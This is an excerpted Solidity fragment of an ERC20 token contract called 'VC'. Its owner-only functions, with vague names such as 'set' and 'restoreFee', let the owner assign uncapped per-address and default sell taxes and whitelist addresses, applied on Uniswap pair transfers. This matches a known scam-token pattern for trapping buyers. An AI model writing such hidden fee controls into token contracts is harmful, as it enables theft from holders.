...
contract VC is MyERC20, Ownable {
    ...
    function setInAccount(address _address) external onlyOwner {
        infinite[_address] = true;
    }

    function getInAccount(address _address) external view onlyOwner returns (bool) {
    ...
    function restoreFee(uint256 _value) external onlyOwner {
        _defaultSellFee = _value;
    }


    function set(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _accountTradeFee[_address] = _value;
    }

    function get(address _address) external view onlyOwner returns (uint256) {
    ...
    function _beforeVerifyTransfer(
        ...
        if (uniswapV2Pair != address(0)) {
            if (from == uniswapV2Pair || _to == uniswapV2Pair) {
